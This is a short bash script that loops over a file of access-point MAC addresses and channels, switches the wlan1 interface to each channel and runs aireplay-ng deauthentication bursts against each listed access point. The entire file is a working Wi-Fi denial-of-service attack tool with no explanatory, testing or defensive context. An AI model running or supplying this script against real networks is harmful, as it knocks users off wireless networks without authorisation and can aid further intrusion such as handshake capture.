#!/usr/bin/env bash

while IFS='' read -r line || [[ -n "$line" ]]; do
        mac=$(echo $line | cut -f1 -d,)
        channel=$(echo $line | cut -f2 -d,)
        iwconfig wlan1 channel $channel
        aireplay-ng -0 10 -a $mac wlan1 -D
done < "macListwl1.txt"
